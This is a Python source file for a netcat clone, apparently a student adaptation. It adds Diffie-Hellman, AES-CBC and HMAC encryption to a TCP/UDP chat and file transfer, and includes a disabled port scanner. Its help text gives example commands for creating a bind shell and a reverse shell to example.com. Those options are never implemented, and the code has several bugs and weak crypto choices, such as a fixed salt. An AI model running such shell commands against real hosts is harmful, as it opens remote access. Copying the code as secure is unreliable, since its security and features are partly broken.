#!/usr/bin/env python3
"""Python netcat implementation."""

import argparse
import os
import pickle
import re
import socket
import sys
import threading

from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives._serialization import Encoding, ParameterFormat, PrivateFormat
from cryptography.hazmat.primitives.asymmetric import dh, padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.hmac import HMAC, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import padding


# -------------------------------------------------------------------------------------------------
# GLOBALS
# -------------------------------------------------------------------------------------------------

# In case the server is running in UDP mode
# it must wait for the client to connect in order
# to retrieve its addr and port in order to be able
# to send data back to it.
UDP_CLIENT_ADDR = None
UDP_CLIENT_PORT = None

NAME = os.path.basename(sys.argv[0]) #获取当前运行的脚本文件的名称
VERSION = "0.1.0-alpha"

# 密钥，数据加密
def generate_dh_keypair():
    # 生成DH算法的参数
    parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
    # 生成私钥和公钥
    private_key = parameters.generate_private_key()
    public_key = private_key.public_key() # 使用生成的私钥，调用public_key()函数生成对应的公钥
    return private_key, public_key,parameters # 返回生成的私钥和公钥作为元组

def derive_shared_key(private_key, remote_public_key):
    # 计算共享密钥
    shared_key = private_key.exchange(remote_public_key) # 使用本地私钥和远程公钥，计算两者之间的共享密钥
    return shared_key
    import os

    # ...

def encrypt_data(data, key):
    # 使用AES算法和CBC模式对数据进行加密
    # 生成一个初始化向量（IV）
    iv = os.urandom(16)  # 16字节的IV用于AES-128
    # 创建一个PKCS7填充对象，分组长度为128位（16字节）
    padder = padding.PKCS7(128).padder()
    # 对数据进行填充
    padded_data = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()) # 创建一个AES算法的Cipher对象，使用传入的密钥key和CBC模式
    encryptor = cipher.encryptor() # 创建一个AES算法的Cipher对象，使用传入的密钥key和CBC模式
    ct = encryptor.update(padded_data) + encryptor.finalize() # 使用加密器对数据data进行加密，并返回加密后的密文
    return ct, iv  # 返回密文和IV

def decrypt_data(ciphertext, key, iv):
    # 使用AES算法和CBC模式对数据进行解密
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()) # 创建一个AES算法的Cipher对象，使用传入的密钥key和CBC模式
    decryptor = cipher.decryptor()  # 创建一个解密器对象
    data = decryptor.update(ciphertext) + decryptor.finalize() # 使用解密器对密文ciphertext进行解密，并返回解密后的原始数据

    # 创建一个PKCS7填充解除器对象
    unpadder = padding.PKCS7(128).unpadder()
    # 对解密后的数据进行解除填充
    unpadded_data = unpadder.update(data) + unpadder.finalize()

    return unpadded_data  # 返回解密后的原始数据

def calculate_hmac(data, key):
    # 使用HMAC算法计算数据的哈希值
    h = HMAC(key, hashes.SHA256(), backend=default_backend()) # 创建一个HMAC对象，使用传入的密钥key和SHA256哈希算法
    h.update(data) # 使用HMAC对象对数据data进行哈希计算
    hmac_value = h.finalize() # 完成哈希计算并返回哈希值

    return hmac_value

def verify_hmac(data, key, hmac_value):
    # 使用HMAC算法验证数据的完整性
    h = HMAC(key, hashes.SHA256(), backend=default_backend()) # 创建一个HMAC对象，使用传入的密钥key和SHA256哈希算法
    h.update(data) # 使用HMAC对象对数据data进行哈希计算
    try:
        h.verify(hmac_value) # 验证数据的完整性，将计算得到的哈希值与已知的哈希值hmac_value进行比较
        return True
    except InvalidSignature:
        return False

def send_key_to_server(public_key,socket):
    """Send the public key to the server."""
    key_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    socket.sendall(key_bytes)

def receive_key_from_server(socket):
    """Receive the server's public key."""
    key_bytes = socket.recv(2048)
    server_public_key = serialization.load_pem_public_key(
        key_bytes,
        backend=default_backend()
    )
    return server_public_key

def receive_key_from_client(socket):
    """Receive the client's public key."""
    key_bytes = socket.recv(2048)
    client_public_key = serialization.load_pem_public_key(
        key_bytes,
        backend=default_backend()
    )
    return client_public_key

# -------------------------------------------------------------------------------------------------
# HELPER FUNCTIONS
# -------------------------------------------------------------------------------------------------
def scan_ports(host, port_range):
    open_ports = []
    for port in port_range:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)  # 设置超时时间为1秒
                result = s.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
        except socket.error:
            pass
    return open_ports

def b2str(data):
    """Convert bytes into string type."""
    try:
        return data.decode("utf-8")
    except UnicodeDecodeError:
        pass
    try:
        return data.decode("utf-8-sig")
    except UnicodeDecodeError:
        pass
    try:
        return data.decode("ascii")
    except UnicodeDecodeError:
        return data.decode("latin-1")

# -------------------------------------------------------------------------------------------------
# CLIENT/SERVER COMMUNICATOIN FUNCTIONS
# -------------------------------------------------------------------------------------------------

def send(s, key, udp=False, crlf=False, verbose=0):
    """Send one newline terminated line to a connected socket."""
    # In case of sending data back to an udp client we need to wait
    # until the client has first connected and told us its addr/port
    if udp and UDP_CLIENT_ADDR is None and UDP_CLIENT_PORT is None:
        while UDP_CLIENT_ADDR is None and UDP_CLIENT_PORT is None: # 表示需要等待 UDP 客户端首次连接，并获取其地址和端口
            pass
        if verbose > 0:
            print("Client:     %s:%i" % (UDP_CLIENT_ADDR, UDP_CLIENT_PORT), file=sys.stderr)

    # Loop for the thread
    while True:
        # Read user input
        data = input("input your data:")
        print('输入成功')

        # Ensure to terminate with desired newline
        if isinstance(data, bytes): # 据据处理，确保末尾以指定的换行符形式结尾
            data = b2str(data)
        if crlf:
            data += "\r\n"
        else:
            data += "\n"

        hmac_value = calculate_hmac(data.encode(), key)
        encrypted_data, iv = encrypt_data(data.encode() + hmac_value, key)
        # data = data.encode() # 重新将字符串转换为字节串
        print('编码成功')
        # Loop until all bytes have been sent
        try:
            if udp:
                s.sendto(iv + encrypted_data, (UDP_CLIENT_ADDR, UDP_CLIENT_PORT))
                print("发送成功")
            else:
                s.sendall(iv + encrypted_data)
                print("tcp发送成功")
        except (OSError, socket.error) as error:
            print("[Send Error] %s" % (error), file=sys.stderr)
            print(s, file=sys.stderr)
            s.close()
            # exit the thread
            return

    # Close connection when thread stops
    s.close()



def receive(s, key, udp=False, bufsize=4096, verbose=0):
    """Read one newline terminated line from a connected socket."""
    global UDP_CLIENT_ADDR
    global UDP_CLIENT_PORT

    if verbose > 0:
        print("Receiving:  bufsize=%i" % (bufsize), file=sys.stderr)
    # Loop for the thread
    while True:
        data = ""
        size = len(data)
        while True:
            try:
                (byte, addr) = s.recvfrom(bufsize)
                iv = byte[:16]  # Extract the last 16 bytes as IV
                ciphertext = byte[16:]  # Remove the last 16 bytes (IV) to get the ciphertext
                decrypted_data = decrypt_data(ciphertext, key, iv)

                # Verify data integrity using HMAC
                hmac_value = decrypted_data[-32:]  # Extract the last 32 bytes as HMAC value
                data_without_hmac = decrypted_data[:-32]  # Remove the last 32 bytes (HMAC value) to get the original data
                if verify_hmac(data_without_hmac, key, hmac_value):
                    data = data_without_hmac.decode('utf-8', errors='replace')
                    print("data:"+data)
                    print("解码成功")
                    print("接受并验证成功")
                    # If we're receiving data from a UDP client
                    # we can finally set its addr/port in order
                    # to send data back to it (see send() function)
                    if udp:
                        UDP_CLIENT_ADDR, UDP_CLIENT_PORT = addr
                else:
                    print("数据完整性验证失败！")
                    return
            except socket.error as err:
                print(err, file=sys.stderr)
                print(s, file=sys.stderr)
                s.close()
                sys.exit(1)
            if not data: #如果 data 为空，表示上游连接已断开，关闭套接字并退出函数
                if verbose > 0:
                    print("[Receive Error] Upstream connection is gone", file=sys.stderr)
                s.close()
                # exit the thread
                return
            # Newline terminates the read request
            if data.endswith("\n"):
                break
            # Sometimes a newline is missing at the end
            # If this round has the same data length as previous, we're done
            if size == len(data): # 如果上一次循环中的数据长度和当前循环中的数据长度相同，表示数据可能缺少换行符，也视为读取请求完成，退出内层循环
                break
            size = len(data)
        print("数据处理")
        # Remove trailing newlines
        data = data.rstrip("\r\n") # 移除数据末尾的 回车符 和 换行符
        data = data.rstrip("\n")
        print("准备打印")
        if verbose > 0:
            print("< ", end="", flush=True, file=sys.stderr)
        print("data:" + data)
        print("打印成功")

    # Close connection when thread stops
    s.close()


def send_file(s, key, filename):
    # Read user input
    with open(filename, 'rb') as file:
        data = file.read(1024)
        hmac_value = calculate_hmac(data, key)
        encrypted_data, iv = encrypt_data(data + hmac_value, key)
        if not data:
            print("文件为空")
        s.sendall(iv + encrypted_data)
    print("文件发送成功！")

def receive_file(s, key, udp=False, bufsize=4096):
    try:
        (byte, addr) = s.recvfrom(bufsize)
        iv = byte[:16]  # Extract the last 16 bytes as IV
        ciphertext = byte[16:]  # Remove the last 16 bytes (IV) to get the ciphertext
        decrypted_data = decrypt_data(ciphertext, key, iv)

        # Verify data integrity using HMAC
        hmac_value = decrypted_data[-32:]  # Extract the last 32 bytes as HMAC value
        data_without_hmac = decrypted_data[
                            :-32]  # Remove the last 32 bytes (HMAC value) to get the original data
        if verify_hmac(data_without_hmac, key, hmac_value):
            data = data_without_hmac.decode('utf-8', errors='replace')
            with open('received_file.txt', 'w', encoding='utf-8') as file:
                if not data:
                    print("文件为空")
                file.write(data)
            print("文件接收成功！")
            print("解码成功")
            print("接受并验证成功")
            # If we're receiving data from a UDP client
            # we can finally set its addr/port in order
            # to send data back to it (see send() function)
            if udp:
                UDP_CLIENT_ADDR, UDP_CLIENT_PORT = addr
        else:
            print("数据完整性验证失败！")
            return
    except socket.error as err:
        print(err, file=sys.stderr)
        print(s, file=sys.stderr)
        s.close()
        sys.exit(1)


# -------------------------------------------------------------------------------------------------
# CLIENT/SERVER INITIALIZATION FUNCTIONS
# -------------------------------------------------------------------------------------------------

#
# Server/Client (TCP+UDP)
#
def create_socket(udp=False, verbose=0):
    """Create TCP or UDP socket."""
    try:
        if udp:
            if verbose > 0:
                print("Socket:     UDP", file=sys.stderr)
            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #AF_INET参数指定了套接字的地址族为 IPv4 地址族。IPv4 是一种用于在 Internet 上唯一标识主机和路由器的地址格式。
        else:
            if verbose > 0:
                print("Socket:     TCP", file=sys.stderr)
            return socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM参数指定了套接字的类型为流式套接字（TCP）。流式套接字提供了面向连接的、可靠的、有序的、双向的字节流传输，使用 TCP 协议来进行数据传输。
    except socket.error as error:
        print("[Socker Error] %s", (error), file=sys.stderr)
        sys.exit(1)


#
# Server (TCP+UDP)
#
def bind(s, host, port, verbose=0):
    """Bind TCP or UDP socket to host/port."""
    if verbose > 0:
        print("Binding:    %s:%i" % (host, port), file=sys.stderr)
    try:
        s.bind((host, port))
    except (OverflowError, OSError, socket.error) as error:
        print("[Bind Error] %s" % (error), file=sys.stderr)
        print(s, file=sys.stderr)
        s.close()
        sys.exit(1)

#
# Server (TCP only)
#
def listen(s, backlog=1, verbose=0):
    """Make TCP socket listen."""
    try:
        if verbose > 0:
            print("Listening:  backlog=%i" % (backlog), file=sys.stderr)
        s.listen(backlog)
    except socket.error as error:
        print("[Listen Error] %s", (error), file=sys.stderr)
        print(s, file=sys.stderr)
        s.close()
        sys.exit(1)

#
# Server (TCP only)
#
def accept(s, verbose=0):
    """Accept connections on TCP socket."""
    try:
        c, addr = s.accept()
    except (socket.gaierror, socket.error) as error:
        print("[Accept Error] %s", (error), file=sys.stderr)
        print(s, file=sys.stderr)
        s.close()
        sys.exit(1)

    host, port = addr
    if verbose > 0:
        print("Client:     %s:%i" % (host, port), file=sys.stderr)

    return c

#
# Client (TCP+UDP)
#
def resolve(hostname, verbose=0):
    """Resolve hostname to IP addr or return False in case of error."""
    if verbose > 0:
        print("Resolving:  %s" % (hostname), file=sys.stderr)
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror as error:
        print("[Resolve Error] %s" % (error), file=sys.stderr)
        return False

#
# Client (TCP+UDP)
#
def connect(s, addr, port, verbose=0):
    """Connect to a server via IP addr/port."""
    if verbose > 0:
        print("Connecting: %s:%i" % (addr, port), file=sys.stderr)
    try:
        s.connect((addr, port))
    except socket.error as error:
        print("[Connect Error] %s" % (error), file=sys.stderr)
        print(s, file=sys.stderr)
        s.close()
        sys.exit(1)

# -------------------------------------------------------------------------------------------------
# CLIENT
# -------------------------------------------------------------------------------------------------

def run_client(host, port, udp=False, bufsize=1024, crlf=False, verbose=0): # 用于连接到指定的主机和端口，并发送数据
    """Connect to host:port and send data."""
    global UDP_CLIENT_ADDR
    global UDP_CLIENT_PORT

    s = create_socket(udp=udp, verbose=verbose) # 套接字是网络编程中用于进行网络通信的一种接口，它允许程序通过网络发送和接收数据。

    addr = resolve(host, verbose=verbose)  # 解析后的地址存储
    if not addr:
        s.close()
        sys.exit(1)

    if udp: # 检查是否UDP模式
        UDP_CLIENT_ADDR = addr
        UDP_CLIENT_PORT = port
    else:
        connect(s, addr, port, verbose=verbose) # TCP连接指定主机

    # 接收parameters并反序列化为parameters变量
    parameters_bytes, _ = s.recvfrom(1024)

    parameters = serialization.load_pem_parameters(parameters_bytes, backend=default_backend())

    # 生成Diffie-Hellman密钥对
    private_key = parameters.generate_private_key()
    public_key = private_key.public_key()  # 使用生成的私钥，调用public_key()函数生成对应的公钥

    # 将公钥发送给服务器
    send_key_to_server(public_key, s)
    # 接收服务器的公钥并计算共享密钥
    server_public_key = receive_key_from_server(s)
    shared_key = derive_shared_key(private_key, server_public_key)

    # 使用共享密钥作为主要密钥来生成会话密钥
    salt = b"mysalt"  # 自定义盐值
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend(),
    )
    session_key = kdf.derive(shared_key)

    flag = input('是否需要发送文件')
    if flag:
        send_file(s, session_key, 'send.txt')

    # Start sending and receiving threads，两个线程分别发送和接受数据
    tr = threading.Thread(
        target=receive, args=(s, session_key, udp, bufsize, verbose)
    )
    ts = threading.Thread(
        target=send, args=(s, session_key, udp, crlf, verbose)
    )
    # If the main thread kills, this thread will be killed too.
    tr.daemon = True
    ts.daemon = True #将接收线程和发送线程设置为守护线程，表示这两个线程将随着主线程的结束而结束
    # Start threads
    tr.start()
    ts.start() #启动接收线程和发送线程，使它们开始执行

    # Do cleanup on the main program
    while True:
        if not tr.is_alive(): #检查接收线程和发送线程是否还在运行
            s.close()
            sys.exit(0)
        if not ts.is_alive():
            s.close()
            sys.exit(0)


# -------------------------------------------------------------------------------------------------
# SERVER
# -------------------------------------------------------------------------------------------------


def run_server(host, port, udp=False, backlog=1, bufsize=1024, crlf=False, verbose=0): #用于启动一个 TCP 或 UDP 服务器并等待无限时间地发送/接收数据
    """Start TCP/UDP server on host/port and wait endlessly to sent/receive data."""
    s = create_socket(udp=udp, verbose=verbose)

    bind(s, host, port, verbose=verbose) # 将套接字 s 绑定到指定的主机 host 和端口号 port 上，verbose 参数用于决定是否打印绑定过程中的信息

    if not udp: # 检查是否使用 UDP 模式
        listen(s, backlog=backlog, verbose=verbose) #设置为监听状态，以等待客户端的连接请求，backlog 参数用于指定连接请求的队列长度
        c = accept(s, verbose=verbose) # 接受客户端的连接请求，并返回一个新的套接字 c，用于与客户端进行通信
    else:
        c = s

    # 生成Diffie-Hellman密钥对
    private_key, public_key, parameters = generate_dh_keypair()

    parameters_bytes = parameters.parameter_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.ParameterFormat.PKCS3
    )
    c.sendall(parameters_bytes)

    send_key_to_server(public_key, c)
    # 接收客户端的公钥并计算共享密钥
    client_public_key = receive_key_from_client(c)
    shared_key = derive_shared_key(private_key, client_public_key)
    # 使用共享密钥作为主要密钥来生成会话密钥
    salt = b"mysalt"  # 自定义盐值，需要与客户端使用相同的盐值
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend(),
    )
    session_key = kdf.derive(shared_key)

    receive_file(c, session_key)

    # start sending and receiving threads，分别用于接收和发送数据
    tr = threading.Thread(
        target=receive, args=(c, session_key, udp, bufsize, verbose)
    )
    ts = threading.Thread(
        target=send, args=(c, session_key, udp, crlf, verbose)
    )
    # if the main thread kills, this thread will be killed too.
    tr.daemon = True # 将接收线程和发送线程设置为守护线程，表示这两个线程将随着主线程的结束而结束
    ts.daemon = True
    # start threads
    tr.start()
    ts.start()

    # do cleanup on the main program
    while True:
        if not tr.is_alive(): # 检查接收线程和发送线程是否还在运行
            c.close()
            s.close()
            sys.exit(0)
        if not ts.is_alive():
            c.close()
            s.close()
            sys.exit(0)


# -------------------------------------------------------------------------------------------------
# COMMAND LINE ARGUMENTS
# -------------------------------------------------------------------------------------------------


def get_version():
    """Return version information."""
    return """%(prog)s: Version %(version)s (%(url)s) by %(author)s""" % (
        {
            "prog": NAME,
            "version": VERSION,
            "url": "https://github.com/cytopia/netcat",
            "author": "cytopia",
        }
    )


def _args_check_port(value):
    """Check arguments for invalid port number."""
    min_port = 1
    max_port = 65535
    intvalue = int(value)

    if intvalue < min_port or intvalue > max_port:
        raise argparse.ArgumentTypeError("%s is an invalid port number." % value)
    return intvalue


def _args_check_forwards(value):
    """Check forward argument (-L/-R) for correct pattern."""
    match = re.search(r"(.+):(.+)", value)
    if match is None or len(match.groups()) != 2:
        raise argparse.ArgumentTypeError("%s is not a valid 'addr:port' format." % value)
    _args_check_port(match.group(2))
    return value


def get_args():
    """Retrieve command line arguments."""
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter, # 指定帮助信息的格式化类，控制帮助信息的输出样式
        add_help=False,
        usage="""%(prog)s [-Cnuv] [-e cmd] hostname port
       %(prog)s [-Cnuv] [-e cmd] -l [hostname] port
       %(prog)s [-Cnuv] -L addr:port [hostname] port
       %(prog)s [-Cnuv] -R addr:port hostname port
       %(prog)s -V, --version
       %(prog)s -h, --help
       """ # 指定在帮助信息中显示的用法信息，可以包含%(prog)作为程序的名称占位符
        % ({"prog": NAME}),
        description="Netcat implementation in Python with connect, listen and forward mode.",
        epilog="""examples:

  Create bind shell
    %(prog)s -l -e '/bin/bash' 8080

  Create reverse shell
    %(prog)s -e '/bin/bash' example.com 4444

  Local forward: Make localhost port available to another interface
    %(prog)s -L 127.0.0.1:3306 192.168.0.1 3306

  Remote forward: Forward local port to remote server
    %(prog)s -R 127.0.0.1:3306 example.com 4444"""
        % ({"prog": NAME}),
    )
    # 将不同类型的命令行参数添加到相应的参数组中
    positional = parser.add_argument_group("positional arguments") # 定位参数是在命令行中出现的位置决定的参数
    mode = parser.add_argument_group("mode arguments") # 模式参数是程序运行的不同模式，例如选择不同的操作模式或功能模式等
    optional = parser.add_argument_group("optional arguments") # 可选参数是不要求在命令行中必须出现的参数
    misc = parser.add_argument_group("misc arguments") # 用于存放其他杂项参数

    positional.add_argument(
        "hostname", nargs="?", type=str, help="Address to listen, forward or connect to"
    )
    positional.add_argument(
        "port", type=_args_check_port, help="Port to listen, forward or connect to"
    )

    mode.add_argument(
        "-l",
        "--listen", # 监听模式
        action="store_true",
        help="Listen mode: Enable listen mode for inbound connects",
    )
    mode.add_argument(
        "-L",
        "--local", # 本地转发
        metavar="addr:port",
        type=_args_check_forwards,
        help="""Local forward mode: Specify local <addr>:<port> to which traffic
should be forwarded to.
Netcat will listen locally (specified by hostname and port) and
forward all traffic to the specified value for -L/--local.""",
    )
    mode.add_argument(
        "-R",
        "--remote", # 远程转发
        metavar="addr:port",
        type=_args_check_forwards,
        help="""Remote forward mode: Specify local <addr>:<port> from which traffic
should be forwarded from.
Netcat will connect remotely (specified by hostname and port) and
for ward all traffic from the specified value for -R/--remote.""",
    )

    optional.add_argument(
        "-e",
        "--exec", # 执行命令
        metavar="cmd",
        type=str,
        help="Execute shell command. Only works with connect or listen mode.",
    )
    optional.add_argument(
        "-C", "--crlf", action="store_true", help="Send CRLF as line-endings (default: LF)",
    )
    optional.add_argument(
        "-n", "--nodns", action="store_true", help="Do not resolve DNS", # 表示不解析 DNS：域名->IP
    )
    optional.add_argument("-u", "--udp", action="store_true", help="UDP mode")
    optional.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="Be verbose and print info to stderr. Use -vv or -vvv for more verbosity.",
    )
    misc.add_argument("-h", "--help", action="help", help="Show this help message and exit")
    misc.add_argument(
        "-V",
        "--version",
        action="version",
        version=get_version(),
        help="Show version information and exit",
    )
    args = parser.parse_args()

    # Check mutually exclive arguments
    if args.exec is not None and (args.local is not None or args.remote is not None):
        parser.print_usage()
        print(
            "%s: error: -e/--cmd cannot be used together with -L/--local or -R/--remote" % (NAME),
            file=sys.stderr, #输出错误信息和警告，也会显示在控制台屏幕
        )
        sys.exit(1)
    if args.listen and (args.local is not None or args.remote is not None):
        parser.print_usage()
        print(
            "%s: error: -l/--listen cannot be used together with -L/--local or -R/--remote"
            % (NAME),
            file=sys.stderr,
        )
        sys.exit(1)
    if args.local is not None and args.remote is not None:
        parser.print_usage()
        print(
            "%s: error: -L/--local cannot be used together with -R/--remote" % (NAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # Required arguments
    if args.hostname is None and (not args.listen and args.local is None):
        parser.print_usage()
        print(
            "%s: error: the following arguments are required: hostname" % (NAME), file=sys.stderr,
        )
        sys.exit(1)

    return args

# -------------------------------------------------------------------------------------------------
# MAIN ENTRYPOINT
# -------------------------------------------------------------------------------------------------

def main():
    """Start the program."""
    args = get_args()

    listen_backlog = 1
    receive_buffer = 1024
    hostname = args.hostname if args.hostname is not None else "0.0.0.0"

    if args.listen:
        run_server(
            hostname,
            args.port,
            args.udp,
            backlog=listen_backlog,
            bufsize=receive_buffer,
            crlf=args.crlf,
            verbose=args.verbose,
        )
    else:
        # host = input("请输入要扫描的主机IP地址或域名：")
        # start_port = int(input("请输入起始端口号："))
        # end_port = int(input("请输入结束端口号："))
        #
        # port_range = range(start_port, end_port + 1)
        # open_ports = scan_ports(host, port_range)
        #
        # if open_ports:
        #     print(f"在主机 {host} 上找到以下打开端口：")
        #     for port in open_ports:
        #         print(f"端口 {port} 是开放的。")
        # else:
        #     print(f"在主机 {host} 上没有找到开放的端口。")

        run_client(
            args.hostname,
            args.port,
            args.udp,
            bufsize=receive_buffer,
            crlf=args.crlf,
            verbose=args.verbose,
        )

if __name__ == "__main__":
    # Catch Ctrl+c and exit without error message
    try:
        main()
    except KeyboardInterrupt:
        print()
        sys.exit(1)


